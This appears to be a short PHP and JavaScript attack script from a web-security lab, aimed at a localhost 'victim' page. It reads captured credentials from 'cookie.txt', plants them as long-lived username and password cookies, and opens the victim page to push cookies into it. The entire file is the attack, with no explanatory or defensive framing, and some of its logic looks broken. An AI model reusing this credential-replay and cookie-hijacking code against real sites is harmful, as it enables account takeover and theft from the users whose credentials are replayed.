<?php
$f = fopen("cookie.txt", "r");
$line = "";
$check = "";
while(!feof($f)){
        $check = fgets($f, 4096);
        if(strlen($check) == 0){
                break;
        }
        $line = $check;
}
if(strlen($line) == 0){
        echo "No cookies";
}
$trimmed = substr($line, 0, strlen($line) - 1);
$split = explode(":", $trimmed);

setcookie('username', $split[0], time()+(60*60*24*365));
setcookie('password', $split[1], time()+(60*60*24*365));
fclose($f);
//unlink("cookie.txt");
?>
<html>
<head>
<script>
var victim = "http://localhost:3000/index.php";
w = open(victim);
w.document.cookie = document.cookie;
</script>
</head>
</html>
<?php
header('Location: index.php');
?>
